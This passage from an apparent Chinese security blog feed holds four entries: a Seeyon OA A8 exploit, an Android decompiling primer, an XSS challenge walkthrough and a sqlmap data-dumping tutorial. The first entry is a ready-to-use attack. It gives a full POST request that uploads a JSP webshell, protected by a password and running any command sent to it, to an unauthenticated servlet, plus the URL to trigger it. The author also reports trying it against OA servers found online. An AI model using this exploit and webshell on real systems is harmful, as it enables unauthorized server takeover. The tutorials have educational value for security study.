    <content type="html"><![CDATA[<h3 id="0x00-漏洞概述"><a href="#0x00-漏洞概述" class="headerlink" title="0x00 漏洞概述"></a>0x00 漏洞概述</h3><p>根据 <a href="https://www.cnvd.org.cn/webinfo/show/5095" target="_blank" rel="noopener">https://www.cnvd.org.cn/webinfo/show/5095</a> 的公告，该系统的漏洞点在于致远OA-A8系统的Servlet接口暴露，安全过滤处理措施不足，使得用户在无需认证的情况下实现任意文件上传。攻击者利用该漏洞，可在未授权的情况下，远程发送精心构造的网站后门文件，从而获取目标服务器权限，在目标服务器上执行任意代码。<br>漏洞影响的产品版本包括：</p><pre><code>致远A8-V5协同管理软件 V6.1sp1致远A8+协同管理软件V7.0、V7.0sp1、V7.0sp2、V7.0sp3致远A8+协同管理软件V7.1</code></pre><a id="more"></a><h3 id="0x01-漏洞详情"><a href="#0x01-漏洞详情" class="headerlink" title="0x01 漏洞详情"></a>0x01 漏洞详情</h3><p>访问<a href="http://xxxx/seeyon/htmlofficeservlet出现" target="_blank" rel="noopener">http://xxxx/seeyon/htmlofficeservlet出现</a></p><p><div align="center"><img src="/images/paperimage/seeyon_oa1.png" alt=""></div><br>说明漏洞很大可能存在</p><h3 id="0x02-POST包"><a href="#0x02-POST包" class="headerlink" title="0x02 POST包"></a>0x02 POST包</h3><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST /seeyon/htmlofficeservlet HTTP/1.1</span><br><span class="line">Content-Length: 1121</span><br><span class="line">User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)</span><br><span class="line">Host: xxxxxxxxx</span><br><span class="line">Pragma: no-cache</span><br><span class="line"></span><br><span class="line">DBSTEP V3.0     355             0               666             DBSTEP=OKMLlKlV</span><br><span class="line">OPTION=S3WYOSWLBSGr</span><br><span class="line">currentUserId=zUCTwigsziCAPLesw4gsw4oEwV66</span><br><span class="line">CREATEDATE=wUghPB3szB3Xwg66</span><br><span class="line">RECORDID=qLSGw4SXzLeGw4V3wUw3zUoXwid6</span><br><span class="line">originalFileId=wV66</span><br><span class="line">originalCreateDate=wUghPB3szB3Xwg66</span><br><span class="line">FILENAME=qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdN1liN4KXwiVGzfT2dEg6</span><br><span class="line">needReadFile=yRWZdAS6</span><br><span class="line">originalCreateDate=wLSGP4oEzLKAz4=iz=66</span><br><span class="line">&lt;%@ page language=&quot;java&quot; import=&quot;java.util.*,java.io.*&quot; pageEncoding=&quot;UTF-8&quot;%&gt;&lt;%!public static String excuteCmd(String c) &#123;StringBuilder line = new StringBuilder();try &#123;Process pro = Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));String temp = null;while ((temp = buf.readLine()) != null) &#123;line.append(temp+&quot;\n&quot;);&#125;buf.close();&#125; catch (Exception e) &#123;line.append(e.getMessage());&#125;return line.toString();&#125; %&gt;&lt;%if(&quot;asasd3344&quot;.equals(request.getParameter(&quot;pwd&quot;))&amp;&amp;!&quot;&quot;.equals(request.getParameter(&quot;cmd&quot;)))&#123;out.println(&quot;&lt;pre&gt;&quot;+excuteCmd(request.getParameter(&quot;cmd&quot;)) + &quot;&lt;/pre&gt;&quot;);&#125;else&#123;out.println(&quot;:-)&quot;);&#125;%&gt;6e4f045d4b8506bf492ada7e3390d7ce</span><br></pre></td></tr></table></figure><p><div align="center"><img src="/images/paperimage/seeyon_oa2.png" alt=""></div></p><p><div align="center"><img src="/images/paperimage/seeyon_oa2_2.png" alt=""></div></p><h3 id="0x03-响应包"><a href="#0x03-响应包" class="headerlink" title="0x03 响应包"></a>0x03 响应包</h3><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">DBSTEP V3.0     386             0               666             DBSTEP=OKMLlKlV</span><br><span class="line">OPTION=S3WYOSWLBSGr</span><br><span class="line">currentUserId=zUCTwigsziCAPLesw4gsw4oEwV66</span><br><span class="line">CREATEDATE=wUghPB3szB3Xwg66</span><br><span class="line">RECORDID=qLSGw4SXzLeGw4V3wUw3zUoXwid6</span><br><span class="line">originalFileId=wV66</span><br><span class="line">originalCreateDate=wUghPB3szB3Xwg66</span><br><span class="line">FILENAME=qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdN1liN4KXwiVGzfT2dEg6</span><br><span class="line">needReadFile=yRWZdAS6</span><br><span class="line">originalCreateDate=wLSGP4oEzLKAz4=iz=66</span><br><span class="line">CLIENTIP=wLCXqUKAP7uhw4g5zi=6</span><br><span class="line">&lt;%@ page language=&quot;java&quot; import=&quot;java.util.*,java.io.*&quot; pageEncoding=&quot;UTF-8&quot;%&gt;&lt;%!public static String excuteCmd(String c) &#123;StringBuilder line = new StringBuilder();try &#123;Process pro = Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));String temp = null;while ((temp = buf.readLine()) != null) &#123;line.append(temp+&quot;\n&quot;);&#125;buf.close();&#125; catch (Exception e) &#123;line.append(e.getMessage());&#125;return line.toString();&#125; %&gt;&lt;%if(&quot;asasd3344&quot;.equals(request.getParameter(&quot;pwd&quot;))&amp;&amp;!&quot;&quot;.equals(request.getParameter(&quot;cmd&quot;)))&#123;out.println(&quot;&lt;pre&gt;&quot;+excuteCmd(request.getParameter(&quot;cmd&quot;)) + &quot;&lt;/pre&gt;&quot;);&#125;else&#123;out.println(&quot;:-)&quot;);&#125;%&gt;</span><br></pre></td></tr></table></figure><p><div align="center"><img src="/images/paperimage/seeyon_oa3.png" alt=""></div></p><h3 id="0x03-验证"><a href="#0x03-验证" class="headerlink" title="0x03 验证"></a>0x03 验证</h3><p>上传成功后访问xxx/seeyon/test123456.jsp?pwd=asasd3344&amp;cmd=ifconfig</p><p>网上搜索到很多对应的oa，但最后的命令执行都失败了，不知道是都修复了还是哪一步出了问题</p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;0x00-漏洞概述&quot;&gt;&lt;a href=&quot;#0x00-漏洞概述&quot; class=&quot;headerlink&quot; title=&quot;0x00 漏洞概述&quot;&gt;&lt;/a&gt;0x00 漏洞概述&lt;/h3&gt;&lt;p&gt;根据 &lt;a href=&quot;https://www.cnvd.org.cn/webinfo/show/5095&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.cnvd.org.cn/webinfo/show/5095&lt;/a&gt; 的公告，该系统的漏洞点在于致远OA-A8系统的Servlet接口暴露，安全过滤处理措施不足，使得用户在无需认证的情况下实现任意文件上传。攻击者利用该漏洞，可在未授权的情况下，远程发送精心构造的网站后门文件，从而获取目标服务器权限，在目标服务器上执行任意代码。&lt;br&gt;漏洞影响的产品版本包括：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;致远A8-V5协同管理软件 V6.1sp1
致远A8+协同管理软件V7.0、V7.0sp1、V7.0sp2、V7.0sp3
致远A8+协同管理软件V7.1
&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
      <category term="安全研究" scheme="http://www.f4guo.top/categories/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/"/>
    
    
      <category term="漏洞分析" scheme="http://www.f4guo.top/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>APP安全测试入门(其一)</title>
    <link href="http://www.f4guo.top/2019/06/26/APP%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8-%E5%85%B6%E4%B8%80/"/>
    <id>http://www.f4guo.top/2019/06/26/APP安全测试入门-其一/</id>
    <published>2019-06-26T14:00:48.000Z</published>
    <updated>2019-10-08T01:35:38.700Z</updated>
    
    <content type="html"><![CDATA[<blockquote><font color="#87CEFF" size="2">青年人关心自己，对周围的人往往不大留意。最忘恩负义的——同时也是最不讨人喜欢的——年龄是17-20岁。对生活尚未习惯，对自己也是如此。不理解生，不理解死，不理解人们，而与此同时又确信他把一切都看透了，正所谓看破红尘，万念俱灰。</font></blockquote><h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>虽然每次看那些技术书籍，前两章都是讲环境搭建，准备工具之类的，觉得很枯燥。现在就是真香打脸</p><h3 id="0x01-磨刀"><a href="#0x01-磨刀" class="headerlink" title="0x01 磨刀"></a>0x01 磨刀</h3><h4 id="AndroidKiller"><a href="#AndroidKiller" class="headerlink" title="AndroidKiller"></a>AndroidKiller</h4><p>个人觉得挺牛逼的apk反编译工具，还在学习中。<br><a id="more"></a></p><h4 id="dex2jar"><a href="#dex2jar" class="headerlink" title="dex2jar"></a>dex2jar</h4><p>dex文件2到jar文件，也就是将apk中的java源码编译生成的java字节码文件反编译成java源码，其中2的英文谐音为two，也就是 dex 到 jar。<br>首先将.apk改为.zip文件，然后解压<br><img src="/images/paperimage/app_sectest_d201.png" alt=""><br>打开解压得到的文件，复制classes.dex到dex2jar的根目录下(建议将classes.dex重命名，后缀不变)<br><img src="/images/paperimage/app_sectest_d202.png" alt=""><br><img src="/images/paperimage/app_sectest_d203.png" alt=""><br>然后在dex2jar根目录下执行命令行：d2j-dex2jar.bat classes.dex<br><img src="/images/paperimage/app_sectest_d204.png" alt=""><br><img src="/images/paperimage/app_sectest_d205.png" alt=""><br>最后用jd-gui直接打开classes-dex2jar.jar文件就ok了，接下就是漫长的源码分析阶段了。</p><h4 id="jd-gui"><a href="#jd-gui" class="headerlink" title="jd-gui"></a>jd-gui</h4><p>是一个用于Java编程语言源代码“.class”文件反编译软件，可以直接打开.jar文件。</p><h3 id="0x02-霍霍向牛羊"><a href="#0x02-霍霍向牛羊" class="headerlink" title="0x02 霍霍向牛羊"></a>0x02 霍霍向牛羊</h3>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;font color=&quot;#87CEFF&quot; size=&quot;2&quot;&gt;青年人关心自己，对周围的人往往不大留意。最忘恩负义的——同时也是最不讨人喜欢的——年龄是17-20岁。对生活尚未习惯，对自己也是如此。不理解生，不理解死，不理解人们，而与此同时又确信他把一切都看透了，正所谓看破红尘，万念俱灰。&lt;/font&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h3&gt;&lt;p&gt;虽然每次看那些技术书籍，前两章都是讲环境搭建，准备工具之类的，觉得很枯燥。现在就是真香打脸&lt;/p&gt;
&lt;h3 id=&quot;0x01-磨刀&quot;&gt;&lt;a href=&quot;#0x01-磨刀&quot; class=&quot;headerlink&quot; title=&quot;0x01 磨刀&quot;&gt;&lt;/a&gt;0x01 磨刀&lt;/h3&gt;&lt;h4 id=&quot;AndroidKiller&quot;&gt;&lt;a href=&quot;#AndroidKiller&quot; class=&quot;headerlink&quot; title=&quot;AndroidKiller&quot;&gt;&lt;/a&gt;AndroidKiller&lt;/h4&gt;&lt;p&gt;个人觉得挺牛逼的apk反编译工具，还在学习中。&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="渗透测试" scheme="http://www.f4guo.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="Android安全" scheme="http://www.f4guo.top/tags/Android%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>有点意思的XSS</title>
    <link href="http://www.f4guo.top/2019/06/23/%E6%9C%89%E7%82%B9%E6%84%8F%E6%80%9D%E7%9A%84XSS/"/>
    <id>http://www.f4guo.top/2019/06/23/有点意思的XSS/</id>
    <published>2019-06-23T08:16:30.000Z</published>
    <updated>2019-07-27T02:31:24.058Z</updated>
    
    <content type="html"><![CDATA[<blockquote><font color="#87CEFF" size="2">我们是多么迅速、多么频繁地改变着我们的生活和幻想啊！一些朋友离开了我们，另一些朋友又随之而去。我们的关系变化着：总有那个时候，我们不再拥有曾经拥有的东西；总有那个时候，我们对我们的过去一无所有。人不是只有一个生命，他有好几个，一个接着一个，而这是他的苦难。——夏多布里昂《墓中回忆录》</font></blockquote><h3 id="0x00前言"><a href="#0x00前言" class="headerlink" title="0x00前言"></a>0x00前言</h3><p>xss漏洞真的是感觉很好挖但有不容易挖，前几天发现一个有意思的<a href="http://prompt.ml/0" target="_blank" rel="noopener">练习平台</a>,试着去做了一下，学到了几点新姿势，在此记录一下。<br><a id="more"></a></p><div align="center"><img src="/images/paperimage/yqxss-p0.png" alt=""></div><h3 id="0x01就是干"><a href="#0x01就是干" class="headerlink" title="0x01就是干"></a>0x01就是干</h3><h4 id="p0-白给"><a href="#p0-白给" class="headerlink" title="p0 白给"></a>p0 白给</h4><p>看到这个页面，先随便输入看看什么情况，如下图：</p><div align="center"><img src="/images/paperimage/yqxss-p0_1.png" alt=""></div><br>其实第一关纯粹白给，啥也没过滤直接插就是了，成功弹窗。<br><div align="center"><img src="/images/paperimage/yqxss-p0_2.png" alt=""></div><br>看到这个url，换个函数试试，嗯？有意思。。。继续往下搞。<br><div align="center"><img src="/images/paperimage/yqxss-p0_3.png" alt=""></div><h4 id="p1-烦人的正则"><a href="#p1-烦人的正则" class="headerlink" title="p1 烦人的正则"></a>p1 烦人的正则</h4><p>到这儿我就机智的先浏览了一下后面的关卡了，大多数和js正则有关系，所以还是需要有一定js基础。别问我，问就是不会，我赶紧看看笔记去……<br>还是先尝试输入”&lt;”、”/“、”&gt;”等这类敏感字符，结合js正则，这句正则大概的意思是将”&lt;&gt;”括起来的内容置换成空。那我就不闭合呗</p><div align="center"><img src="/images/paperimage/yqxss-p1.png" alt=""></div><h4 id="p2-换个payload"><a href="#p2-换个payload" class="headerlink" title="p2 换个payload"></a>p2 换个payload</h4><p>这个就很容易懂了，直接过滤”=”和”(“</p><div align="center"><img src="/images/paperimage/yqxss-p2_0.png" alt=""></div><br>过滤”=”好说，换个payload不就好了。但是还是有括号啊，编个码试一下<br><div align="center"><img src="/images/paperimage/yqxss-p2_1.png" alt=""></div><br>em……好像还是不行，各种绕但卡在这里很久都不行，最后忍不住了还是看了一眼答案。什么？还有答案，网址我放文末吧，还是要自己先搞搞。<br><div align="center"><img src="/images/paperimage/jbjx.jpg" alt=""></div><br>其实我思路是对的….就差一点<br><div align="center"><img src="/images/paperimage/yqxss-p2_2.png" alt=""></div><h4 id="p3-这个简单"><a href="#p3-这个简单" class="headerlink" title="p3 这个简单"></a>p3 这个简单</h4><p>根据输入和代码的意思判断，将HTML注释符中的“-&gt;”替换成了下划线.HTML中的注释符又不止这一个,“–!&gt;”也是可以的</p><p><div align="center"><img src="/images/paperimage/yqxss-p3_0.png" alt=""></div></p><p><div align="center"><img src="/images/paperimage/yqxss-p3_1.png" alt=""></div><br>后面的越来越难搞了，慢慢更新吧</p><p><a href="https://github.com/cure53/XSSChallengeWiki/wiki/prompt.ml#" target="_blank" rel="noopener">答案</a></p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;font color=&quot;#87CEFF&quot; size=&quot;2&quot;&gt;我们是多么迅速、多么频繁地改变着我们的生活和幻想啊！一些朋友离开了我们，另一些朋友又随之而去。我们的关系变化着：总有那个时候，我们不再拥有曾经拥有的东西；总有那个时候，我们对我们的过去一无所有。人不是只有一个生命，他有好几个，一个接着一个，而这是他的苦难。——夏多布里昂《墓中回忆录》&lt;/font&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;0x00前言&quot;&gt;&lt;a href=&quot;#0x00前言&quot; class=&quot;headerlink&quot; title=&quot;0x00前言&quot;&gt;&lt;/a&gt;0x00前言&lt;/h3&gt;&lt;p&gt;xss漏洞真的是感觉很好挖但有不容易挖，前几天发现一个有意思的&lt;a href=&quot;http://prompt.ml/0&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;练习平台&lt;/a&gt;,试着去做了一下，学到了几点新姿势，在此记录一下。&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="渗透测试" scheme="http://www.f4guo.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="Web安全" scheme="http://www.f4guo.top/tags/Web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Sqlmap命令行（其三）</title>
    <link href="http://www.f4guo.top/2019/05/13/Sqlmap%E5%91%BD%E4%BB%A4%E8%A1%8C%EF%BC%88%E5%85%B6%E4%B8%89%EF%BC%89/"/>
    <id>http://www.f4guo.top/2019/05/13/Sqlmap命令行（其三）/</id>
    <published>2019-05-13T08:26:07.000Z</published>
    <updated>2019-05-18T03:58:20.519Z</updated>
    
    <content type="html"><![CDATA[<blockquote><font color="#87CEFF" size="2"> </font></blockquote><h3 id="0x0D-列举数据库管理系统的模式"><a href="#0x0D-列举数据库管理系统的模式" class="headerlink" title="0x0D 列举数据库管理系统的模式"></a>0x0D 列举数据库管理系统的模式</h3><p><strong>参数：–schema和–exclude-sysdbs</strong><br>用户可用此选项列举数据库管理系统的模式。模式列表包含所有数据库、表、列、触发器和他们各自的类型。<br>同样地，可使用参数“–exclude-sysdbs”排除系统数据库。</p><p>下面是的例子测试对象是Mysql:<br>部分输出如下：<br><a id="more"></a><br><figure class="highlight sql hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">[...]</span><br><span class="line">Database: mysql</span><br><span class="line">Table: procs_priv</span><br><span class="line">[8 columns]</span><br><span class="line">+<span class="hljs-comment">--------------+----------------------------------------+</span></span><br><span class="line">| Column       | Type                                   |</span><br><span class="line">+<span class="hljs-comment">--------------+----------------------------------------+</span></span><br><span class="line">| Timestamp    | timestamp                              |</span><br><span class="line">| User         | char(16)                               |</span><br><span class="line">| Db           | char(64)                               |</span><br><span class="line">| Grantor      | char(77)                               |</span><br><span class="line">| Host         | char(60)                               |</span><br><span class="line">| Proc_priv    | <span class="hljs-keyword">set</span>(<span class="hljs-string">'Execute'</span>,<span class="hljs-string">'Alter Routine'</span>,<span class="hljs-string">'Grant'</span>) |</span><br><span class="line">| Routine_name | <span class="hljs-built_in">char</span>(<span class="hljs-number">64</span>)                               |</span><br><span class="line">| Routine_type | enum(<span class="hljs-string">'FUNCTION'</span>,<span class="hljs-string">'PROCEDURE'</span>)           |</span><br><span class="line">+<span class="hljs-comment">--------------+----------------------------------------+</span></span><br><span class="line">[...]</span><br><span class="line"><span class="hljs-keyword">Database</span>: mysql</span><br><span class="line"><span class="hljs-keyword">Table</span>: ndb_binlog_index</span><br><span class="line">[<span class="hljs-number">7</span> <span class="hljs-keyword">columns</span>]</span><br><span class="line">+<span class="hljs-comment">-----------+---------------------+</span></span><br><span class="line">| <span class="hljs-keyword">Column</span>    | <span class="hljs-keyword">Type</span>                |</span><br><span class="line">+<span class="hljs-comment">-----------+---------------------+</span></span><br><span class="line">| <span class="hljs-keyword">Position</span>  | <span class="hljs-built_in">bigint</span>(<span class="hljs-number">20</span>) <span class="hljs-keyword">unsigned</span> |</span><br><span class="line">| deletes   | <span class="hljs-built_in">bigint</span>(<span class="hljs-number">20</span>) <span class="hljs-keyword">unsigned</span> |</span><br><span class="line">| epoch     | <span class="hljs-built_in">bigint</span>(<span class="hljs-number">20</span>) <span class="hljs-keyword">unsigned</span> |</span><br><span class="line">| <span class="hljs-keyword">File</span>      | <span class="hljs-built_in">varchar</span>(<span class="hljs-number">255</span>)        |</span><br><span class="line">| inserts   | <span class="hljs-built_in">bigint</span>(<span class="hljs-number">20</span>) <span class="hljs-keyword">unsigned</span> |</span><br><span class="line">| schemaops | <span class="hljs-built_in">bigint</span>(<span class="hljs-number">20</span>) <span class="hljs-keyword">unsigned</span> |</span><br><span class="line">| updates   | <span class="hljs-built_in">bigint</span>(<span class="hljs-number">20</span>) <span class="hljs-keyword">unsigned</span> |</span><br><span class="line">+<span class="hljs-comment">-----------+---------------------+</span></span><br></pre></td></tr></table></figure></p><p><strong><em>1.列举表中数据条数</em></strong><br><strong>参数：–count</strong><br>有时我们只想知道有多少数据而不想知道具体的数据内容，此时就可以使用该参数。如：<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="hljs-string">"http://192.168.21.129/sqlmap/mssql/iis/get_int.asp?id=1"</span> --count -D testdb</span><br></pre></td></tr></table></figure></p><p>部分输出如下：<br><figure class="highlight sql hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Database: testdb</span><br><span class="line">+<span class="hljs-comment">----------------+---------+</span></span><br><span class="line">| Table          | Entries |</span><br><span class="line">+<span class="hljs-comment">----------------+---------+</span></span><br><span class="line">| dbo.users      | 4       |</span><br><span class="line">| dbo.users_blob | 2       |</span><br><span class="line">+<span class="hljs-comment">----------------+---------+</span></span><br></pre></td></tr></table></figure></p><p><strong><em>2.列举表中数据</em></strong><br><strong>参数：–dump、-C、-T、-D、–start、–stop和–where</strong><br>权限允许时可以列举表中数据。用参数“-D”指定数据库，用参数“-T”指定数据表，用参数“-C”指定目标列。<br>若只指定了数据表而没有指定数据库则默认使用当前数据库。若没有指定列则列举表中全部列。<br>下例是以Firebird为目标：<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="hljs-string">"http://192.168.136.131/sqlmap/firebird/get_int.php?id=1"</span> --dump -T users</span><br></pre></td></tr></table></figure></p><p>部分输出如下：<br><figure class="highlight sql hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Database: Firebird_masterdb</span><br><span class="line">Table: USERS</span><br><span class="line">[4 entries]</span><br><span class="line">+<span class="hljs-comment">----+--------+------------+</span></span><br><span class="line">| ID | NAME   | SURNAME    |</span><br><span class="line">+<span class="hljs-comment">----+--------+------------+</span></span><br><span class="line">| 1 | luther | blisset     |</span><br><span class="line">| 2 | fluffy | bunny       |</span><br><span class="line">| 3 | wu     | ming        |</span><br><span class="line">| 4 | NULL   | nameisnull  |</span><br><span class="line">+<span class="hljs-comment">---+--------+-------------+</span></span><br></pre></td></tr></table></figure></p><p>只使用参数“–dump”和“-D”可以一次性列举整个数据库中所有数据。</p><p>Sqlmap会自动将参数“–dump”列举的数据保存到CSV格式文件中，文件具体路径会在Sqlmap的输出中给出，如：<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="hljs-string">"http://192.168.136.131/sqlmap/sqlite/get_int.php?id=1"</span> -D DSSchool --dump</span><br></pre></td></tr></table></figure></p><p>部分输出为：<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[11:15:27] [INFO] analyzing table dump <span class="hljs-keyword">for</span> possible password hashes</span><br><span class="line">Database: DSSchool</span><br><span class="line">Table: T_SCORESYSTEMTEACHERS</span><br><span class="line">[2 entries]</span><br><span class="line">+-----+----------+-------+---------+----------+</span><br><span class="line">| AGE | NAME     | TITLE | ACCOUNT | PASSWORD |</span><br><span class="line">+-----+----------+-------+---------+----------+</span><br><span class="line">| 21  | neo      | ??    | 001     | 001      |</span><br><span class="line">| 31  | morphine | ??    | 002     | 002      |</span><br><span class="line">+-----+----------+-------+---------+----------+</span><br><span class="line">     </span><br><span class="line">[11:15:27] [INFO] table <span class="hljs-string">'DSSchool.T_SCORESYSTEMTEACHERS'</span> dumped to CSV file <span class="hljs-string">'/home/werner/.sqlmap/output/192.168.56.102/dump/DSSchool/T_SCORESYSTEMTEACHERS.csv'</span></span><br></pre></td></tr></table></figure></p><p>截取的输出中最后一行便是CSV文件保存的路径。</p><p>若只想列举部分数据可以使用参数“–start”和“–stop”。如只想列举第一条数据可以添加“–stop 1”，<br>只想列举第二和第三条数据可以添加“–start 1 –stop 3”，可见这是一个左开右闭区间。<br>区间范围仅在盲注中有效，因为在基于错误信息的注入和联合查询注入中区间范围会被忽略。</p><p>除了用区间范围限制列举的数据外，还可以用“–where”参数来限制列举的数据。<br>“–where”参数会被Sqlmap转换成WHERE子句，如“–where id&gt;3”会只列举列id的值大于3的数据。</p><p>如你所见，Sqlmap十分灵活。可以囫囵地列举整个数据库，也可以细致地在表中选择列，在列中又选择特定数据。<br><strong><em>3.列举所有数据库所有表中所有数据</em></strong><br><strong>参数：–dump-all和–exclude-sysdbs</strong><br>使用参数“–dump-all”可列举所有数据库所有表中所有数据。同样地，可使用参数“–exclude-sysdbs”排除系统数据库。</p><p>注意微软SQL Server的master数据库不属于系统数据库，因为有些管理员会在这个数据库中存储用户数据。<br><strong><em>4.在数据库、表、列中搜索</em></strong><br><strong>参数：–search、-C、-T和-D</strong><br>可以搜索数据库名，在所有数据库中搜索表名，在所有数据库的所有表中搜索列名。<br>参数“–search”要和下列参数之一配合使用：</p><pre><code>-C：后跟以逗号分隔的列名，在整个数据库管理系统中搜索-T：后跟以逗号分隔的表名，在整个数据库管理系统中搜索-D：后跟以逗号分隔的库名，在整个数据库管理系统中搜索</code></pre><p>在搜索时，Sqlmap会询问用户进行精确搜索还是包含搜索。<br>默认为包含搜索，即搜索的字符串包含于结果中就认为命中。<br>精确搜索要求搜索的字符串与结果完全相等。<br><strong><em>5.运行自定义的SQL语句</em></strong><br><strong>参数：–sql-query和–sql-shell</strong><br>这一功能允许执行任意的SQL语句，Sqlmap会自动解析给出的SQL语句，选择恰当的注入技术并将给出的SQL语句打包到payload中。</p><p>如果查询是个SELECT语句，Sqlmap会返回查询结果。如果Web应用使用的数据库管理系统支持多语句查询，Sqlmap会使用堆注入技术。<br>但要注意Web应用可能不支持堆查询，例如PHP使用Mysql时不支持堆查询，但使用PostgreSQL时支持堆查询。</p><p>下例的目标是SQL Server 2000：<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="hljs-string">"http://192.168.136.131/sqlmap/mssql/get_int.php?id=1"</span> --sql-query <span class="hljs-string">"SELECT 'foo'"</span> -v 1</span><br></pre></td></tr></table></figure></p><p>部分输出如下：<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[hh:mm:14] [INFO] fetching SQL SELECT query output: <span class="hljs-string">'SELECT '</span>foo<span class="hljs-string">''</span></span><br><span class="line">[hh:mm:14] [INFO] retrieved: foo</span><br><span class="line">SELECT <span class="hljs-string">'foo'</span>:</span><br><span class="line"><span class="hljs-string">'foo'</span></span><br></pre></td></tr></table></figure></p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="hljs-string">"http://192.168.136.131/sqlmap/mssql/get_int.php?id=1"</span> --sql-query <span class="hljs-string">"SELECT 'foo', 'bar'"</span> -v <span class="hljs-number">2</span></span><br></pre></td></tr></table></figure><p>部分输出如下：<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[hh:mm:50] [INFO] fetching SQL SELECT query output: <span class="hljs-string">'SELECT '</span>foo<span class="hljs-string">', '</span>bar<span class="hljs-string">''</span></span><br><span class="line">[hh:mm:50] [INFO] the SQL query provided has more than a field. sqlmap will now</span><br><span class="line">unpack it into distinct 